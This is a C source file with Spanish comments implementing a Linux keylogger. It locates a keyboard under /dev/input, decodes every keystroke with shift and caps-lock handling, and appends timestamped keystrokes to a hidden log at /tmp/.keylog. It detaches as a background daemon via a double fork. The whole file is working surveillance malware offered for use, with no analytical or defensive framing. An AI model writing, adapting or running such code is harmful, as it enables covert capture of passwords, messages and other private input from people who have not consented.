#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>  // para códigos KEY_*

// Archivo de log (ruta oculta en /tmp)
#define LOG_FILE "/tmp/.keylog"
// Tiempo de espera en select (microsegundos) para permitir manejo de señales
#define SELECT_TIMEOUT_USEC 1000000

// Variable global para indicar terminación
static volatile sig_atomic_t keep_running = 1;

// Handler para SIGTERM y SIGINT
void signal_handler(int sig) {
    (void)sig;
    keep_running = 0;
}

// ------------------------------------------------------------
// Tabla de mapeo de códigos KEY_* a caracteres ASCII (US QWERTY)
// Los índices corresponden a los códigos del kernel (0-255)
// Para teclas especiales se usa una cadena entre corchetes
// ------------------------------------------------------------
static const char *key_map[256] = {
    [0] = "[RESERVED]",
    [1] = "[ESC]",
    [2] = "1",
    [3] = "2",
    [4] = "3",
    [5] = "4",
    [6] = "5",
    [7] = "6",
    [8] = "7",
    [9] = "8",
    [10] = "9",
    [11] = "0",
    [12] = "-",
    [13] = "=",
    [14] = "[BACKSPACE]",
    [15] = "[TAB]",
    [16] = "q",
    [17] = "w",
    [18] = "e",
    [19] = "r",
    [20] = "t",
    [21] = "y",
    [22] = "u",
    [23] = "i",
    [24] = "o",
    [25] = "p",
    [26] = "[",
    [27] = "]",
    [28] = "[ENTER]",
    [29] = "[CTRL]",
    [30] = "a",
    [31] = "s",
    [32] = "d",
    [33] = "f",
    [34] = "g",
    [35] = "h",
    [36] = "j",
    [37] = "k",
    [38] = "l",
    [39] = ";",
    [40] = "'",
    [41] = "`",
    [42] = "[SHIFT]",
    [43] = "\\",
    [44] = "z",
    [45] = "x",
    [46] = "c",
    [47] = "v",
    [48] = "b",
    [49] = "n",
    [50] = "m",
    [51] = ",",
    [52] = ".",
    [53] = "/",
    [54] = "[SHIFT]",
    [55] = "[ASTERISK]",   // tecla *
    [56] = "[ALT]",
    [57] = "[SPACE]",
    [58] = "[CAPSLOCK]",
    [59] = "[F1]",
    [60] = "[F2]",
    [61] = "[F3]",
    [62] = "[F4]",
    [63] = "[F5]",
    [64] = "[F6]",
    [65] = "[F7]",
    [66] = "[F8]",
    [67] = "[F9]",
    [68] = "[F10]",
    [69] = "[NUMLOCK]",
    [70] = "[SCROLLLOCK]",
    [71] = "[HOME]",
    [72] = "[UP]",
    [73] = "[PAGEUP]",
    [74] = "-",
    [75] = "[LEFT]",
    [76] = "[CENTER]",
    [77] = "[RIGHT]",
    [78] = "+",
    [79] = "[END]",
    [80] = "[DOWN]",
    [81] = "[PAGEDOWN]",
    [82] = "[INSERT]",
    [83] = "[DELETE]",
    [84] = "",
    [85] = "",
    [86] = "",
    [87] = "[F11]",
    [88] = "[F12]",
    // ... se pueden añadir más códigos hasta 255
    // Para teclas multimedia se pueden añadir cadenas descriptivas
};

// Modificadores de mayúsculas (Shift, AltGr, Ctrl, CapsLock)
static int shift_pressed = 0;
static int ctrl_pressed = 0;
static int alt_pressed = 0;
static int caps_lock_on = 0;

// Función para actualizar el estado de modificadores según el código y valor
void update_modifiers(unsigned int code, int value) {
    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
        shift_pressed = (value == 1 || value == 2) ? 1 : 0;
    } else if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) {
        ctrl_pressed = (value == 1 || value == 2) ? 1 : 0;
    } else if (code == KEY_LEFTALT || code == KEY_RIGHTALT) {
        alt_pressed = (value == 1 || value == 2) ? 1 : 0;
    } else if (code == KEY_CAPSLOCK) {
        // CapsLock se activa/desactiva en el evento de presión (value=1)
        if (value == 1)
            caps_lock_on = !caps_lock_on;
    }
}

// Convertir una tecla a su representación de cadena, aplicando modificadores
const char* key_to_string(unsigned int code, int value) {
    // Solo procesamos eventos de presión (value=1) o repetición (value=2)
    if (value != 1 && value != 2)
        return NULL;
    
    // Si es una tecla modificadora, actualizamos estado pero no devolvemos nada
    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT ||
        code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL ||
        code == KEY_LEFTALT || code == KEY_RIGHTALT ||
        code == KEY_CAPSLOCK) {
        return NULL;
    }
    
    const char *base = key_map[code];
    if (!base || base[0] == '\0')
        return "[UNKNOWN]";
    
    // Si la tecla es una letra (a-z), aplicamos mayúscula según shift y caps
    if (code >= KEY_A && code <= KEY_Z) {
        int upper = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);
        // base apunta a minúscula, creamos una cadena estática para la mayúscula
        static char upper_str[2];
        if (upper) {
            upper_str[0] = base[0] - 32; // convertir a mayúscula
            upper_str[1] = '\0';
            return upper_str;
        } else {
            return base;
        }
    }
    
    // Para teclas de símbolos que dependen de Shift (1->!, 2->@, etc.)
    // Mapeo específico para teclado US
    if (shift_pressed) {
        switch (code) {
            case KEY_1: return "!";
            case KEY_2: return "@";
            case KEY_3: return "#";
            case KEY_4: return "$";
            case KEY_5: return "%";
            case KEY_6: return "^";
            case KEY_7: return "&";
            case KEY_8: return "*";
            case KEY_9: return "(";
            case KEY_0: return ")";
            case KEY_MINUS: return "_";
            case KEY_EQUAL: return "+";
            case KEY_GRAVE: return "~";
            case KEY_LEFTBRACE: return "{";
            case KEY_RIGHTBRACE: return "}";
            case KEY_BACKSLASH: return "|";
            case KEY_SEMICOLON: return ":";
            case KEY_APOSTROPHE: return "\"";
            case KEY_COMMA: return "<";
            case KEY_DOT: return ">";
            case KEY_SLASH: return "?";
            default: break;
        }
    }
    
    // Para otras teclas (especiales) devolvemos la cadena base
    return base;
}

// Función para escribir en el log con timestamp
void write_log(const char *str) {
    if (!str) return;
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;
    
    // Obtener timestamp
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    struct tm tm;
    localtime_r(&ts.tv_sec, &tm);
    char timebuf[64];
    strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &tm);
    fprintf(fp, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
    fflush(fp);
    fclose(fp);
}

// Buscar el primer dispositivo de teclado en /dev/input/event*
int find_keyboard_device() {
    int fd;
    char path[64];
    // Primero intentamos abrir event0, event1, ... hasta event15 (típico)
    for (int i = 0; i < 32; i++) {
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;
        
        // Verificar si soporta teclas (usando EVIOCGBIT)
        unsigned long evbit[2] = {0, 0};
        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0) {
            close(fd);
            continue;
        }
        // Verificar si el bit EV_KEY está activo
        if (!(evbit[0] & (1 << EV_KEY))) {
            close(fd);
            continue;
        }
        
        // Verificar si al menos soporta KEY_A (código 30)
        unsigned long keybit[8] = {0};
        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
            close(fd);
            continue;
        }
        if (keybit[0] & (1 << KEY_A)) {
            // Es un teclado válido
            return fd;  // devolvemos descriptor abierto
        }
        close(fd);
    }
    return -1;
}

// Función principal del keylogger (en modo demonio)
void run_keylogger() {
    int fd = find_keyboard_device();
    if (fd < 0) {
        // Intentar de nuevo en 5 segundos
        while (keep_running && fd < 0) {
            sleep(5);
            fd = find_keyboard_device();
        }
        if (fd < 0) {
            fprintf(stderr, "No se encontró ningún teclado.\n");
            return;
        }
    }
    
    struct input_event ev;
    fd_set readfds;
    struct timeval tv;
    int ret;
    
    while (keep_running) {
        FD_ZERO(&readfds);
        FD_SET(fd, &readfds);
        tv.tv_sec = 0;
        tv.tv_usec = SELECT_TIMEOUT_USEC;
        
        ret = select(fd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue; // señal recibida
            // Error en select, cerrar y reconectar
            close(fd);
            fd = find_keyboard_device();
            if (fd < 0) {
                sleep(5);
                continue;
            }
            continue;
        }
        if (ret == 0) {
            // Timeout, simplemente continuar para manejar señales
            continue;
        }
        
        // Leer eventos mientras haya datos
        while (1) {
            ret = read(fd, &ev, sizeof(ev));
            if (ret < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) break;
                // Error de lectura, reconectar
                close(fd);
                fd = find_keyboard_device();
                if (fd < 0) {
                    sleep(5);
                    continue;
                }
                break;
            }
            if (ret != sizeof(ev)) continue;
            
            // Procesar evento
            if (ev.type == EV_KEY) {
                // Actualizar estado de modificadores
                update_modifiers(ev.code, ev.value);
                // Obtener representación de la tecla
                const char *keystr = key_to_string(ev.code, ev.value);
                if (keystr) {
                    write_log(keystr);
                }
            }
        }
    }
    
    close(fd);
}

// Convertir en demonio (fork, etc.)
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) exit(EXIT_SUCCESS); // proceso padre termina
    
    // Crear nueva sesión
    if (setsid() < 0) {
        perror("setsid");
        exit(EXIT_FAILURE);
    }
    
    // Ignorar señal de control de terminal
    signal(SIGCHLD, SIG_IGN);
    
    // Segundo fork para asegurar que no sea líder de sesión
    pid = fork();
    if (pid < 0) {
        perror("fork2");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Cambiar directorio a root para no bloquear montajes
    chdir("/");
    
    // Cerrar descriptores estándar
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirigir a /dev/null
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    
    // Instalar manejadores de señales
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    // Convertir en demonio
    daemonize();
    
    // Ejecutar el keylogger
    run_keylogger();
    
    return 0;
}